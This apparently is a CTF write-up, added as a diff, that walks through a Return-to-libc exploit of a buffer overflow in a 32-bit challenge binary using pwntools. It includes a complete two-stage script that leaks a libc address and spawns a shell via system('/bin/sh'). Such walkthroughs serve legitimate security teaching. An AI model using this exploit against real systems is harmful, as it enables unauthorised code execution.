@@ -1,0 +1,211 @@
+To solve this Capture The Flag (CTF) pwn challenge using Pwntools, you'll perform a classic Return-to-libc attack to exploit a buffer overflow vulnerability in the `vulnerable_function()`. Here's a step-by-step guide along with the code to accomplish this:
+
+### **Step 1: Analyze the Binary**
+
+First, check the binary protections to understand what exploit techniques are viable.
+
+```python
+from pwn import *
+
+# Load the binary
+binary = ELF('./rop')
+
+# Check the security features of the binary
+print(binary.checksec())
+```
+
+Assuming the output is:
+```
+[*] '/path/to/rop'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+This tells us:
+
+- **NX enabled**: The stack is non-executable. We cannot execute shellcode on the stack.
+- **No PIE**: The binary’s base address is fixed.
+- **No Stack Canary**: We can overwrite the return address without worrying about canaries.
+
+### **Step 2: Finding the Offset to EIP**
+
+We need to find out how many bytes into our input we can overwrite the return address (EIP).
+
+```python
+from pwn import *
+
+# Generate a cyclic pattern
+pattern = cyclic(200)
+
+# Start the process
+p = process('./rop')
+
+# Send the pattern
+p.sendline(pattern)
+
+# Wait for the process to crash
+p.wait()
+
+# Open the core file
+core = p.corefile
+
+# Find the offset where EIP is overwritten
+offset = cyclic_find(core.eip)
+print('Offset to EIP:', offset)
+```
+
+Alternatively, knowing the buffer is 136 bytes and considering the saved EBP (4 bytes) and the return address (4 bytes), the offset is `136 + 4 = 140` bytes.
+
+### **Step 3: Leaking an Address to Calculate libc Base**
+
+Our goal is to leak the address of a libc function to calculate the base address of libc in memory.
+
+- Use the `write` function to leak an address from the Global Offset Table (GOT).
+- Set up the stack to call `write(1, read_got, 4)`.
+
+```python
+from pwn import *
+
+# Load the binary and libc
+binary = ELF('./rop')
+libc = ELF('./libc.so.6')
+
+# Process or Remote connection
+p = process('./rop')  # Use remote('host', port) if remote
+
+offset = 140  # Offset to EIP
+
+# Addresses required
+write_plt = binary.plt['write']
+read_got = binary.got['read']
+main_plt = binary.symbols['vulnerable_function']
+
+# Build the payload to leak read's address
+payload = b'A' * offset
+payload += p32(write_plt)
+payload += p32(main_plt)  # Return back to vulnerable_function after leaking
+payload += p32(1)         # File descriptor (stdout)
+payload += p32(read_got)  # Address to leak
+payload += p32(4)         # Number of bytes to read
+
+# Send the payload
+p.sendline(payload)
+
+# Receive the leaked address
+p.recvuntil(b'Hello, World\n')  # Adjust based on program output
+leaked_read = p.recv(4)
+read_addr = u32(leaked_read)
+print('Leaked read address:', hex(read_addr))
+
+# Calculate the libc base
+libc_base = read_addr - libc.symbols['read']
+print('libc base address:', hex(libc_base))
+```
+
+### **Step 4: Calculating System and "/bin/sh" Addresses**
+
+Using the libc base address, calculate the addresses of `system` and `"/bin/sh"`.
+
+```python
+# Calculate system and "/bin/sh" addresses
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+print('system address:', hex(system_addr))
+print('"/bin/sh" address:', hex(bin_sh_addr))
+```
+
+### **Step 5: Crafting the Final Exploit**
+
+Build the second payload to call `system("/bin/sh")`.
+
+```python
+# Build the payload to get a shell
+payload2 = b'A' * offset
+payload2 += p32(system_addr)
+payload2 += p32(0xdeadbeef)  # Return address (can be any value)
+payload2 += p32(bin_sh_addr)
+
+# Send the final payload
+p.sendline(payload2)
+
+# Interact with the shell
+p.interactive()
+```
+
+### **Complete Exploit Script**
+
+```python
+from pwn import *
+
+# Load the binary and libc
+binary = ELF('./rop')
+libc = ELF('./libc.so.6')
+
+# Start the process or connect remotely
+p = process('./rop')  # Use remote('host', port) if needed
+
+offset = 140  # Offset to EIP
+
+# Addresses
+write_plt = binary.plt['write']
+read_got = binary.got['read']
+main_plt = binary.symbols['vulnerable_function']
+
+# Stage 1: Leak read's libc address
+payload = b'A' * offset
+payload += p32(write_plt)
+payload += p32(main_plt)
+payload += p32(1)         # fd = stdout
+payload += p32(read_got)  # GOT entry of read
+payload += p32(4)         # Number of bytes
+
+# Send the payload
+p.sendline(payload)
+
+# Receive the leaked address
+p.recvuntil(b'Hello, World\n')
+leaked_read = p.recv(4)
+read_addr = u32(leaked_read)
+print('Leaked read address:', hex(read_addr))
+
+# Calculate libc base
+libc_base = read_addr - libc.symbols['read']
+print('libc base address:', hex(libc_base))
+
+# Calculate system and "/bin/sh" addresses
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+# Stage 2: Get a shell
+payload2 = b'A' * offset
+payload2 += p32(system_addr)
+payload2 += p32(0xdeadbeef)  # Return address after system (unused)
+payload2 += p32(bin_sh_addr)
+
+# Send the final payload
+p.sendline(payload2)
+
+# Get interactive shell
+p.interactive()
+```
+
+### **Additional Notes**
+
+- **Adjust Offsets if Necessary**: The exact offset may differ. Ensure the `offset` variable matches the EIP overwrite point.
+- **Remote Exploitation**: If the challenge is remote, replace `process('./rop')` with `remote('challenge.ctf.com', port)`.
+- **Use a Debugger**: To troubleshoot, use GDB (`gdb.attach(p)`) at any point in the script.
+- **Ensuring Correct libc Version**: Make sure the `libc.so.6` you're using matches the one on the target system, as offsets can vary between versions.
+
+### **Summary of Steps**
+
+1. **Overflow the Buffer**: Use the vulnerability in `vulnerable_function()` to overflow the buffer and control EIP.
+2. **Leak libc Address**: Call `write` to leak the address of `read` from the GOT, allowing us to calculate the libc base address.
+3. **Calculate Offsets**: Determine the addresses of `system` and `"/bin/sh"` in the libc.
+4. **Execute system("/bin/sh")**: Craft a payload to call `system("/bin/sh")`, giving us a shell.
+5. **Interact with the Shell**: Use `p.interactive()` to interact with the shell and capture the flag.
+
+By following these steps and understanding each part of the exploit, you can adapt the technique to similar buffer overflow challenges requiring a Return-to-libc attack.
